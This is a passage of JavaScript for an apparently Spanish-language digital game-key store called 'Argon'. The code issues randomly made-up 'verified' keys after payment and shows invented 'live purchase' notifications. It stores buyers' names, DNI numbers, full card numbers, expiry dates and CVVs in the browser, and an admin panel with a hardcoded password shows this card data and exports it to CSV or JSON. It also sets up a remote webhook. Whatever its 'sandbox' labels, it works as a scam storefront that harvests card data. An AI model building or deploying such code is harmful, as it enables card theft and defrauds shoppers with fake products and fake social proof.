    submitBtn.innerHTML = `<i class="fa-solid fa-lock"></i> <span>Pagar Ahora y Obtener Producto</span>`;

    renderSuccessScreen(record);
    cart = [];
    updateCartBadge();
    appliedDiscount = 0;
    document.getElementById('sandboxForm').reset();
    updateCardPreview();
}

function renderSuccessScreen(tx) {
    document.getElementById('cashbackNotice').innerText = `¡Acreditamos +${formatARS(tx.cashbackEarned)} de Cashback en tu Cartera Argon!`;
    const container = document.getElementById('keysContainer');
    container.innerHTML = '';

    tx.items.forEach(item => {
        const fullProd = products.find(p => p.id === item.id) || item;
        for (let i = 0; i < item.qty; i++) {
            const key = 'ARGON-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
            
            myVaultKeys.push({
                name: item.name,
                image: fullProd.image,
                key: key,
                date: tx.date
            });

            const div = document.createElement('div');
            div.className = 'bg-[#261259] border border-purple-700/60 p-4 rounded-xl flex flex-col sm:flex-row items-center justify-between gap-4';
            div.innerHTML = `
                <div class="flex items-center space-x-3.5">
                    <img src="${fullProd.image}" class="w-14 h-20 object-cover rounded">
                    <div>
                        <h4 class="font-bold text-sm text-white">${item.name}</h4>
                        <span class="text-xs text-emerald-400 font-semibold">Clave Digital Verificada</span>
                    </div>
                </div>
                <div class="flex items-center gap-2">
                    <code class="bg-[#160a36] border border-purple-600 px-4 py-2.5 rounded-lg font-mono text-emerald-400 font-bold text-sm select-all">${key}</code>
                    <button onclick="navigator.clipboard.writeText('${key}'); showToast('Clave copiada al portapapeles', 'fa-copy');" class="bg-purple-600 hover:bg-purple-500 text-white px-3.5 py-2.5 rounded-lg text-xs font-bold">
                        <i class="fa-solid fa-copy"></i>
                    </button>
                </div>
            `;
            container.appendChild(div);
        }
    });

    localStorage.setItem('ohmy_vault_keys', JSON.stringify(myVaultKeys));
    updateVaultBadge();
    switchView('success');
}

// ============================================================================
// PANEL DE ADMINISTRACIÓN (/ #admin) CON CREADOR DE PRODUCTOS
// ============================================================================
function openAdminModal() {
    document.getElementById('adminModal').classList.remove('hidden');
    document.getElementById('adminAuthSection').classList.remove('hidden');
    document.getElementById('adminContentSection').classList.add('hidden');
    document.getElementById('adminPasswordInput').value = '';
    document.getElementById('adminErrorMsg').classList.add('hidden');
}

function closeAdminModal() {
    document.getElementById('adminModal').classList.add('hidden');
    if (window.location.hash === '#admin') {
        history.replaceState(null, null, window.location.pathname + window.location.search);
    }
}

function verifyAdminPassword() {
    const pass = document.getElementById('adminPasswordInput').value;
    if (pass === 'ohmyadmin2026') {
        document.getElementById('adminAuthSection').classList.add('hidden');
        document.getElementById('adminContentSection').classList.remove('hidden');
        loadAdminDatabaseRecords();
    } else {
        document.getElementById('adminErrorMsg').classList.remove('hidden');
    }
}

function saveWebhookUrl() {
    const url = document.getElementById('webhookUrlInput').value.trim();
    localStorage.setItem('ohmy_remote_webhook', url);
    showToast('URL de Base de Datos Remota guardada', 'fa-cloud-arrow-up');
}

function handleAddCustomProduct(e) {
    e.preventDefault();
    const name = document.getElementById('newProdName').value.trim();
    const category = document.getElementById('newProdCat').value;
    const platform = document.getElementById('newProdPlatform').value.trim();
    const price = Number(document.getElementById('newProdPrice').value);
    const originalPrice = Number(document.getElementById('newProdOldPrice').value);
    const imgInput = document.getElementById('newProdImg').value.trim();

    const newProd = {
        id: Date.now(),
        name,
        category,
        platform,
        region: "GLOBAL",
        price,
        originalPrice: originalPrice > price ? originalPrice : Math.round(price * 1.25),
        cashback: Math.round(price * 0.10),
        seller: "ArgonOfficial",
        image: imgInput || createCleanCardArtwork(platform.toUpperCase(), '$' + price, "#3b188f", "#140930", "#34d399", "ARGON KEY")
    };

    customProducts.unshift(newProd);
    localStorage.setItem('ohmy_custom_products', JSON.stringify(customProducts));
    products = [...customProducts, ...defaultProducts];
    filterProducts();
    document.getElementById('addProductForm').reset();
    showToast('Producto publicado exitosamente en el catálogo', 'fa-check');
}

function loadAdminDatabaseRecords() {
    const container = document.getElementById('adminDbRecords');
    container.innerHTML = '';
    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    document.getElementById('dbCountBadge').innerText = db.length;

    if (db.length === 0) {
        container.innerHTML = `<p class="text-center text-purple-300 py-6">Aún no hay operaciones registradas.</p>`;
        return;
    }

    db.slice().reverse().forEach(tx => {
        const div = document.createElement('div');
        div.className = 'bg-[#2a175e] border border-purple-700 p-3.5 rounded-xl space-y-1.5';
        div.innerHTML = `
            <div class="flex justify-between font-bold text-white">
                <span>${tx.id} — ${tx.date}</span>
                <span class="text-emerald-400">${formatARS(tx.total)}</span>
            </div>
            <p class="text-purple-200"><strong>Usuario/Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI/Dato:</strong> ${tx.buyer.dni}</p>
            <p class="text-purple-200"><strong>Tipo:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Detalle:</strong> ${tx.buyer.cardNum || 'N/A'} (${tx.buyer.cardExp || '-'} - CVV: ${tx.buyer.cardCvv || '-'})</p>
            <details class="pt-1">
                <summary class="cursor-pointer text-amber-400 font-bold">Ver JSON completo</summary>
                <pre class="bg-[#160a36] p-2.5 rounded mt-1.5 overflow-x-auto text-[10px] text-emerald-300">${JSON.stringify(tx, null, 2)}</pre>
            </details>
        `;
        container.appendChild(div);
    });
}

function exportDatabaseJSON() {
    const db = localStorage.getItem('ohmy_sandbox_db') || '[]';
    const blob = new Blob([db], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'argon_db.json';
    a.click();
}

function exportDatabaseCSV() {
    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    if (!db.length) return;
    let csv = 'ID,Fecha,Nombre,Email,DNI_Dato,Metodo,Detalle_Tarjeta,Vencimiento,CVV,Total\n';
    db.forEach(t => {
        csv += `"${t.id}","${t.date}","${t.buyer.name}","${t.buyer.email}","${t.buyer.dni}","${t.paymentMethod}","${t.buyer.cardNum || ''}","${t.buyer.cardExp || ''}","${t.buyer.cardCvv || ''}",${t.total}\n`;
    });
    const blob = new Blob([csv], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'argon_db.csv';
    a.click();
}

function clearDatabase() {
    localStorage.removeItem('ohmy_sandbox_db');
    loadAdminDatabaseRecords();
}

// ============================================================================
// NOTIFICACIONES DE COMPRAS EN VIVO (SOCIAL PROOF) & SOPORTE FAQ
// ============================================================================
function startLivePurchaseNotifications() {
    const buyers = [
        "Matías de Córdoba", "Valentina de CABA", "Lucas de Rosario",
        "Joaquín de Posadas", "Camila de Mendoza", "Nicolás de La Plata"
    ];

    setInterval(() => {
        const toast = document.getElementById('livePurchaseToast');
        if (!toast || !document.getElementById('viewStore') || document.getElementById('viewStore').classList.contains('hidden')) return;

        const randomBuyer = buyers[Math.floor(Math.random() * buyers.length)];
        const randomProd = products[Math.floor(Math.random() * products.length)];

        document.getElementById('toastImg').src = randomProd.image;
        document.getElementById('toastBuyer').innerText = `${randomBuyer} compró`;
        document.getElementById('toastProduct').innerText = randomProd.name;

        toast.classList.remove('hidden');
        setTimeout(() => {
            toast.classList.add('hidden');
        }, 4500);
    }, 18000);
}

function toggleSupportWidget() {
    document.getElementById('supportFaqBox').classList.toggle('hidden');
}
